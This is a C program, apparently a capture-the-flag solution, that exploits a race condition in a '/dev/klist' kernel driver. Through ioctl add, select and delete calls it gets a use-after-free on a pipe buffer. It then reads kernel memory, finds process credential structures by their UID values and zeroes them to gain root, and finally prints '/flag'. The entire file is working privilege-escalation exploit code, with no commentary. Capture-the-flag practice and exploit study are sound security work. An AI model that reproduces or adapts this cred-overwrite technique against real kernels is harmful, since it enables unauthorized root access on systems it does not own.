#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <wait.h>

#define PIPE_BUF_SZIE 0x280
#define UID 1000

int fd;

typedef struct
{
	size_t size;
	char *buf;
}Data;

void add(size_t size, char *buf)
{
	Data data;
	data.size = size;
	data.buf = buf; 
	ioctl(fd, 0x1337, &data);
}

void select_item(size_t index)
{
	ioctl(fd, 0x1338, index);
}

void delete(size_t index)
{
	ioctl(fd, 0x1339, index);
}

void list_head(char *buf)
{
	ioctl(fd, 0x133A, buf);
}

void check_root()
{
	while(1)
	{
		sleep(1);
		if(getuid() == 0)
		{
			puts("[*] get root");
			system("cat /flag");
			exit(0);
		}
	}
}

int main()
{
	fd = open("/dev/klist", O_RDWR);
	if(fd < 0)
	{
		puts("[-] open kilst error");
		exit(0);
	}
	
	char buf1[PIPE_BUF_SZIE], buf2[PIPE_BUF_SZIE], bufA[PIPE_BUF_SZIE], bufB[PIPE_BUF_SZIE];
	
	memset(buf1, 'A', PIPE_BUF_SZIE);
	memset(buf2, 'A', PIPE_BUF_SZIE);
	memset(bufA, 'A', PIPE_BUF_SZIE);
	memset(bufB, 'B', PIPE_BUF_SZIE);
	
	add(PIPE_BUF_SZIE - 24, bufA);
	select_item(0);
	
	int pid = fork();
	if(pid < 0)
	{
		puts("[-] fork error");
		exit(0);
	}
	else if(pid == 0)  // child 
	{
		for(int i=0; i<200; i++)
		{
			if(fork() == 0)
				check_root();
		}
		
		while(1)
		{
			add(PIPE_BUF_SZIE - 24, bufA);
			select_item(0);
			delete(0);
			add(PIPE_BUF_SZIE - 24, bufB);
			read(fd, buf2, PIPE_BUF_SZIE - 24);
			if(buf2[0] != 'A')
			{
				puts("[+] race competed in child process");
				puts(buf2);
				break;
			}
			delete(0);
		}
		sleep(1);
		delete(0);
		int pipe_fd[2];
		pipe(pipe_fd);
		write(pipe_fd[1], bufB, PIPE_BUF_SZIE);
		size_t mem_len = 0x1000000;
		uint32_t *data = calloc(1, mem_len);
		read(fd, data, mem_len);
		int count = 0;
		size_t max_len = 0;
		for(int i=0; i<mem_len/4; i++)
		{
			if(data[i]==UID && data[i+1]==UID && data[i+7]==UID)
			{
				puts("[+] find creds");
				memset(data+i, 0, 28);
				max_len = i;
				if(count++ > 2)
				{
					break;
				}
			}
		}
		if(max_len == 0)
		{
			puts("[-] find creds failed");
			exit(0);
		}
		write(fd, data, max_len*4);
		check_root();
	}
	else  // parent
	{
		while(1)
		{
			list_head(buf1);
			read(fd, buf1, PIPE_BUF_SZIE-24);
			if(buf1[0] != 'A')
			{
				puts("[+] parent detected race");
				break;
			}
		}
		wait(NULL);
	}
	
	return 0;
}
